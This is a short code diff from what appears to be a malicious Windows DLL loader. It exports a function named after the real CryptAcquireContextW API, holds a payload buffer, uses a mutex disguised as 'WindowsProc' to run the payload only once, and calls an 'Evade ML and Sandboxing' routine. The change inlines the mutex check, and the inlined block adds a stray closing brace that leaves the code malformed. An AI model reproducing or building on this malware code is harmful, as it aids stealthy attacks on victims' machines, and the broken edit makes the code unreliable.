@@ -13,22 +13,6 @@
 #define MUTEX_NAME TEXT("WindowsProc")
 
 
-/*
-
-    Important Overhead
-
-*/
-
-// Mutex management to prevent double execution
-void checkMutex() {
-    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
-    if (hMutex != NULL) {
-        if (GetLastError() == ERROR_ALREADY_EXISTS) {
-            // Mutex already exists, indicating the payload has been executed
-            CustomExitProcess();
-        }
-    }
-}
 
 /*
 
@@ -181,7 +165,14 @@ __declspec(dllexport) void CryptAcquireContextW() {
     char payload[PSIZE];
 
     // Check if payload has already been executed using Mutex
-    checkMutex();
+    HANDLE hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
+    if (hMutex != NULL) {
+        if (GetLastError() == ERROR_ALREADY_EXISTS) {
+            // Mutex already exists, indicating the payload has been executed
+            CustomExitProcess();
+        }
+    }
+}
 
     // Evade ML and Sandboxing checks
     stale();
